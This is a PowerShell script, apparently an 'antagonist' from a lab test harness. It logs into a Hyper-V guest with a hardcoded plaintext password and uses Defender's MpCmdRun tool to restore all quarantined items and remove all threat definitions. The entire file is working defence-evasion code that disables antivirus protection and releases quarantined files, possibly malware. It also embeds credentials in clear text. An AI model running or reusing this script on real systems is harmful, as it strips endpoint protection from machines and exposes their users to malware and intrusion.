# antagonist-defender-mpcmd.ps1 - use MpCmdRun to remove threat definitions /
# restore items / check status. MpCmdRun has its own tamper handling.
param(
    [string]$VmId = '7b66415c-52cb-468e-b9bd-368746f42863'
)
$ErrorActionPreference = 'Continue'
function W([string]$m) { Write-Output $m }
"=== defender-mpcmd @ $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ==="

$user = 'test'; $pass = 'Kolomina520!'
$cred = New-Object System.Management.Automation.PSCredential("$env:COMPUTERNAME\$user", (ConvertTo-SecureString $pass -AsPlainText -Force))
$deadline = (Get-Date).AddSeconds(120); $s = $null
while ((Get-Date) -lt $deadline) {
    try { $s = New-PSSession -VmId $VmId -Credential $cred -ErrorAction Stop; break } catch {}
    Start-Sleep -Seconds 2
}
if (-not $s) { W "ERROR: connect failed"; exit 1 }
W "PS Direct connected"

$r = Invoke-Command -Session $s -ScriptBlock {
    $out = @()
    $mp = 'C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26070.9-0\MpCmdRun.exe'
    if (-not (Test-Path $mp)) {
        # discover
        $cand = Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe' -ErrorAction SilentlyContinue | Sort-Object FullName -Descending | Select-Object -First 1
        if ($cand) { $mp = $cand.FullName }
    }
    if (Test-Path $mp) {
        $out += "MpCmdRun: $mp"
        $v = & $mp -Version 2>&1 | Out-String
        $out += "version: $v"
        # restore all quarantined
        $rest = & $mp -Restore -All 2>&1 | Out-String
        $out += "restore-all: $rest"
        # remove all threat definitions
        $rem = & $mp -RemoveDefinitions -All 2>&1 | Out-String
        $out += "remove-defs: $rem"
    } else {
        $out += "MpCmdRun not found"
    }
    ,$out
}
$r | ForEach-Object { W "  $_" }
Remove-PSSession $s
W "=== defender-mpcmd done ==="